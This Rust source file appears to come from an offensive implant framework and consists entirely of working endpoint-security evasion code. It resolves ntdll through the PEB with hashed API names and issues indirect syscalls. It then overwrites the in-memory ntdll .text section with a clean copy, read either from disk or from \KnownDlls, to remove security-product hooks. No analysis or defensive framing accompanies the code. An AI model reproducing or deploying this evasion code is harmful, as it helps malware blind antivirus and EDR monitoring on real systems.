/// Resolve ntdll base via PEB on x64 (no GetModuleHandleA in IAT).
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn resolve_ntdll_base() -> *mut u8 {
    use crate::resolve::api_hash::{peb_get_module_base, h};
    peb_get_module_base(h::DLL_NTDLL) as *mut u8
}

#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
unsafe fn resolve_ntdll_base() -> *mut u8 {
    windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *mut u8
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct IoStatusBlock { status: isize, information: usize }

#[cfg(target_os = "windows")]
pub unsafe fn unhook_ntdll_disk() -> bool {
    use crate::evasion::syscalls::{get_ssn_h, indirect_syscall, indirect_syscall_10};
    use crate::resolve::api_hash::h;

    let ntdll_base = resolve_ntdll_base();
    if ntdll_base.is_null() { return false; }

    // NT path as wide chars: \??\C:\Windows\System32\ntdll.dll
    let nt_path: [u16; 36] = [
        0x005C,0x003F,0x003F,0x005C,0x0043,0x003A,0x005C,0x0057,0x0069,0x006E,
        0x0064,0x006F,0x0077,0x0073,0x005C,0x0053,0x0079,0x0073,0x0074,0x0065,
        0x006D,0x0033,0x0032,0x005C,0x006E,0x0074,0x0064,0x006C,0x006C,0x002E,
        0x0064,0x006C,0x006C,0,0,0,
    ];
    #[repr(C)]
    struct UnicodeStr { length: u16, max_length: u16, _pad: u32, buf: *const u16 }
    #[repr(C)]
    struct ObjAttrs { length: u32, root_dir: usize, obj_name: *const UnicodeStr, attrs: u32, sec_desc: usize, sec_qos: usize }
    let us = UnicodeStr { length: 66, max_length: 66, _pad: 0, buf: nt_path.as_ptr() };
    let oa = ObjAttrs { length: core::mem::size_of::<ObjAttrs>() as u32, root_dir: 0, obj_name: &us, attrs: 0x40, sec_desc: 0, sec_qos: 0 };
    let mut iosb = IoStatusBlock { status: 0, information: 0 };
    let mut file_h: isize = 0;
    let Some((ssn_open, tramp_open)) = get_ssn_h(h::NT_OPEN_FILE) else { return false; };
    // FILE_READ_DATA|SYNCHRONIZE=0x00100001, ShareRead=1, FILE_SYNCHRONOUS_IO_NONALERT|FILE_NON_DIRECTORY_FILE=0x60
    let status = indirect_syscall(ssn_open, tramp_open,
        &mut file_h as *mut isize as usize, 0x00100001,
        &oa as *const ObjAttrs as usize,
        &mut iosb as *mut IoStatusBlock as usize,
        1, 0x60);
    if status < 0 || file_h == 0 { return false; }

    let mut buf = vec![0u8; 0x20_0000];
    let mut rd_iosb = IoStatusBlock { status: 0, information: 0 };
    let Some((ssn_read, tramp_read)) = get_ssn_h(h::NT_READ_FILE) else {
        if let Some((sc, tc)) = get_ssn_h(h::NT_CLOSE) { indirect_syscall(sc, tc, file_h as usize, 0,0,0,0,0); }
        return false;
    };
    // NtReadFile: Handle, Event, ApcRoutine, ApcContext, IoStatusBlock, Buffer, Length, ByteOffset, Key
    indirect_syscall_10(ssn_read, tramp_read,
        file_h as usize, 0, 0, 0,
        &mut rd_iosb as *mut IoStatusBlock as usize,
        buf.as_mut_ptr() as usize,
        buf.len() as usize,
        0, 0, 0);
    if let Some((ssn_c, tramp_c)) = get_ssn_h(h::NT_CLOSE) {
        indirect_syscall(ssn_c, tramp_c, file_h as usize, 0, 0, 0, 0, 0);
    }

    let disk_ntdll = buf.as_ptr();
    let (text_rva, text_size) = get_text_section(disk_ntdll);
    if text_size == 0 { return false; }

    let target = ntdll_base.add(text_rva);
    let ph = usize::MAX; // -1 = current process

    if let Some((prot_ssn, prot_tramp)) = get_ssn_h(h::NT_PROT_VM) {
        let mut base = target as usize; let mut sz = text_size; let mut old = 0u32;
        indirect_syscall(prot_ssn, prot_tramp, ph,
            &mut base as *mut usize as usize, &mut sz as *mut usize as usize,
            0x40, &mut old as *mut u32 as usize, 0); // PAGE_EXECUTE_READWRITE
        core::ptr::copy_nonoverlapping(disk_ntdll.add(text_rva), target, text_size);
        let mut base2 = target as usize; let mut sz2 = text_size;
        indirect_syscall(prot_ssn, prot_tramp, ph,
            &mut base2 as *mut usize as usize, &mut sz2 as *mut usize as usize,
            old as usize, &mut old as *mut u32 as usize, 0);
    } else {
        core::ptr::copy_nonoverlapping(disk_ntdll.add(text_rva), target, text_size);
    }
    true
}

#[cfg(target_os = "windows")]
pub(crate) unsafe fn get_text_section(base: *const u8) -> (usize, usize) {
    let e_lfanew     = *(base.add(0x3C) as *const u32) as usize;
    let nt           = base.add(e_lfanew);
    let num_sections = *(nt.add(0x06) as *const u16) as usize;
    let opt_size     = *(nt.add(0x14) as *const u16) as usize;
    let sections     = nt.add(0x18 + opt_size) as *const [u8; 40];
    for i in 0..num_sections {
        let sec = &*sections.add(i);
        if &sec[0..5] == b".text" {
            let virt_size = u32::from_le_bytes([sec[16],sec[17],sec[18],sec[19]]) as usize;
            let virt_rva  = u32::from_le_bytes([sec[12],sec[13],sec[14],sec[15]]) as usize;
            return (virt_rva, virt_size);
        }
    }
    (0, 0)
}

#[cfg(target_os = "windows")]
pub unsafe fn unhook_ntdll_knowndlls() -> bool {
    use crate::evasion::syscalls::{get_ssn_h, indirect_syscall, indirect_syscall_10};
    use crate::resolve::api_hash::h;
    let ntdll_base = resolve_ntdll_base();
    if ntdll_base.is_null() { return false; }

    let name_buf: [u16; 20] = [
        0x005C,0x004B,0x006E,0x006F,0x0077,0x006E,0x0044,0x006C,0x006C,0x0073,
        0x005C,0x006E,0x0074,0x0064,0x006C,0x006C,0x002E,0x0064,0x006C,0x006C,
    ];

    #[repr(C)]
    struct UnicodeString {
        length:     u16,
        max_length: u16,
        _pad:       u32,
        buffer:     *const u16,
    }
    #[repr(C)]
    struct ObjectAttributes {
        length:        u32,
        root_dir:      usize,
        object_name:   *const UnicodeString,
        attributes:    u32,
        security_desc: usize,
        security_qos:  usize,
    }

    let us = UnicodeString { length: 40, max_length: 40, _pad: 0, buffer: name_buf.as_ptr() };
    let oa = ObjectAttributes {
        length:        core::mem::size_of::<ObjectAttributes>() as u32,
        root_dir:      0,
        object_name:   &us as *const UnicodeString,
        attributes:    0x40,
        security_desc: 0,
        security_qos:  0,
    };

    let Some((open_ssn, open_tramp)) = get_ssn_h(h::NT_OPEN_SEC) else { return false; };
    let mut section_handle: usize = 0;
    let status = indirect_syscall(
        open_ssn, open_tramp,
        &mut section_handle as *mut usize as usize,
        0x0004,
        &oa as *const ObjectAttributes as usize,
        0, 0, 0,
    );
    if status != 0 || section_handle == 0 { return false; }

    let nt_close_h = |h_val: usize| {
        if let Some((sc, tc)) = get_ssn_h(h::NT_CLOSE) { indirect_syscall(sc, tc, h_val, 0, 0, 0, 0, 0); }
    };
    let Some((map_ssn, map_tramp)) = get_ssn_h(h::NT_MAP_SEC) else {
        nt_close_h(section_handle); return false;
    };

    let mut base_address: usize = 0;
    let mut view_size: usize = 0;
    let map_status = indirect_syscall_10(
        map_ssn, map_tramp,
        section_handle, usize::MAX,
        &mut base_address as *mut usize as usize,
        0, 0, 0,
        &mut view_size as *mut usize as usize,
        2, 0, 0x02,
    );
    if map_status != 0 || base_address == 0 {
        nt_close_h(section_handle); return false;
    }

    let mapped = base_address as *const u8;
    let (text_rva, text_size) = get_text_section(mapped);
    if text_size > 0 {
        let target = ntdll_base.add(text_rva);
        let ph = usize::MAX;
        if let Some((prot_ssn, prot_tramp)) = get_ssn_h(h::NT_PROT_VM) {
            let mut base = target as usize; let mut sz = text_size; let mut old = 0u32;
            indirect_syscall(prot_ssn, prot_tramp, ph,
                &mut base as *mut usize as usize, &mut sz as *mut usize as usize,
                0x40, &mut old as *mut u32 as usize, 0); // PAGE_EXECUTE_READWRITE
            core::ptr::copy_nonoverlapping(mapped.add(text_rva), target, text_size);
            let mut base2 = target as usize; let mut sz2 = text_size;
            indirect_syscall(prot_ssn, prot_tramp, ph,
                &mut base2 as *mut usize as usize, &mut sz2 as *mut usize as usize,
                old as usize, &mut old as *mut u32 as usize, 0);
        } else {
            core::ptr::copy_nonoverlapping(mapped.add(text_rva), target, text_size);
        }
    }

    if let Some((unmap_ssn, unmap_tramp)) = get_ssn_h(h::NT_UNMAP_SEC) {
        indirect_syscall(unmap_ssn, unmap_tramp, usize::MAX, base_address, 0, 0, 0, 0);
    }
    nt_close_h(section_handle);
    text_size > 0
}
